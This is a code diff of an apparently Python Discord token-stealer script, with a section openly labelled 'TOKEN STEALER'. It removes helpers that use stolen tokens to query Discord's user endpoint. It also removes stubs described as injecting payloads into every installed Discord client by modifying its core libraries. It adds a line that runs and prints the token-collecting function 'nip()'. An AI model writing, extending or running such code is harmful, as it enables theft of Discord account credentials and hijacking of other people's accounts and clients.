@@ -30,47 +30,6 @@ PATHS = {
 API = "https://discordapp.com/api/v9/"  # Discord API to use
 
 
-###############################################
-# DISCORD API CONTROL
-###############################################
-
-##################################
-# GET HEADERS
-##################################
-
-def get_headers(token: Optional[str]=None, content_type: Optional[str]="application/json"):
-    """
-    Generate headers
-
-    :param str token: Token; Client secret, OAuth token. Used when Auth is needed to make a request
-    :param str content_type: They type of content getting sent to Discords API
-    """
-    headers = {
-        "Content-Type": content_type,
-        # User agent from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
-    }
-    if token != None: headers.update({"Authorization": token}) 
-    return headers
-
-
-##################################
-# GET USER DATA
-##################################
-
-def get_user_data(token: str):
-    """
-    Fetch simple user data via https://discord.com/developers/docs/resources/user#get-user
-
-    :param str token: Token for authentication when making a request
-    """
-    return get(API+"users/@me", headers=get_headers(token)).json()
-
-
-###############################################
-# TOKEN STEALER
-###############################################
-
 ##################################
 # NIP
 ##################################
@@ -129,31 +88,4 @@ def nip():
                                         tokens.append(token)
     return tokens
 
-
-###############################################
-# HOOK
-###############################################
-
-def hook(payload: Any="", parent: Optional[bool]=True):
-    """
-    Injects payload into all installed discord clients (Unless specified)
-    
-    :: NOTE
-    : This does change core discord librarys, to revert back use `unhook()`!
-
-    :param any payload: May be a file or an url to raw text
-    :param bool parent: If true a script will watch the injection to make sure everything goes well
-    """
-    pass
-
-
-###############################################
-# UNHOOK
-###############################################
-
-def unhook():
-    """
-    Unhooks any payload that was injected, will also kill the "parent" (if enabled). This will also stop the payload from rehooking.
-    """
-    pass
-
+print(nip())
